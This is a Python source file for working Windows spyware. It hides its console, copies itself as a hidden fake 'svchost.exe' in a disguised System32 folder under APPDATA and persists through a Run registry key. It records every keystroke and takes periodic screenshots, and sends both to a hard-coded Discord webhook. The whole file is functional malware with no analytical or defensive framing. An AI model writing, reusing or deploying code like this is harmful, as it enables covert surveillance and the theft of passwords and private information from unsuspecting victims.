import os, sys, time, shutil, requests, threading, pyautogui, io
from PIL import ImageGrab
from pynput import keyboard
import winreg

WEBHOOK_URL = "https://discord.com/api/webhooks/1571709971345838110/fj9EO0weC27wdUYFBSgV9u6e8JWxPg-inYLw4dYtWn_1Y3tBqqrMVPuVhn4Uy7G0oJl3"
REG_KEY_NAME = "JbPrompt"

log_buffer = ""
buffer_lock = threading.Lock()

def hide_console():
    try:
        import ctypes
        kernel32 = ctypes.WinDLL('kernel32'); user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        if hWnd: user32.ShowWindow(hWnd, 0)
    except: pass

def setup_persistence():
    appdata = os.getenv('APPDATA')
    target_dir = os.path.join(appdata, "Microsoft", "Windows", "System32")
    os.makedirs(target_dir, exist_ok=True)
    os.system(f'attrib +h "{target_dir}"')
    target_exe = os.path.join(target_dir, "svchost.exe")
    current_path = os.path.abspath(sys.argv[0])
    if current_path.lower() != target_exe.lower():
        try:
            shutil.copy2(current_path, target_exe)
            os.system(f'attrib +h "{target_exe}"')
        except: pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, target_exe)
        winreg.CloseKey(key)
    except: pass
    if current_path.lower() != target_exe.lower() and os.path.exists(target_exe):
        os.startfile(target_exe); sys.exit(0)

def send_to_discord(text=None, image=None):
    if text:
        try: requests.post(WEBHOOK_URL, json={"content": f"```\n{text}\n```"}, timeout=5)
        except: pass
    if image:
        try: requests.post(WEBHOOK_URL, files={"file": ("screenshot.png", image, "image/png")}, timeout=10)
        except: pass

def keylogger_thread():
    global log_buffer
    def on_press(key):
        global log_buffer
        with buffer_lock:
            try:
                if hasattr(key, 'char') and key.char is not None: log_buffer += key.char
                else:
                    if key == keyboard.Key.enter: log_buffer += "\n"
                    elif key == keyboard.Key.space: log_buffer += " "
                    elif key == keyboard.Key.backspace: log_buffer += "[BKSP]"
                    elif key == keyboard.Key.tab: log_buffer += "[TAB]"
            except: pass
    def flush_logs():
        global log_buffer
        while True:
            time.sleep(60)
            with buffer_lock:
                if log_buffer: send_to_discord(text=log_buffer); log_buffer = ""
    threading.Thread(target=flush_logs, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener: listener.join()

def spyware_thread():
    while True:
        time.sleep(300) 
        try:
            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            buffer.seek(0)
            send_to_discord(image=buffer.read())
        except: pass

if __name__ == "__main__":
    hide_console()
    setup_persistence()
    threading.Thread(target=keylogger_thread, daemon=True).start()
    threading.Thread(target=spyware_thread, daemon=True).start()
    while True: time.sleep(10)
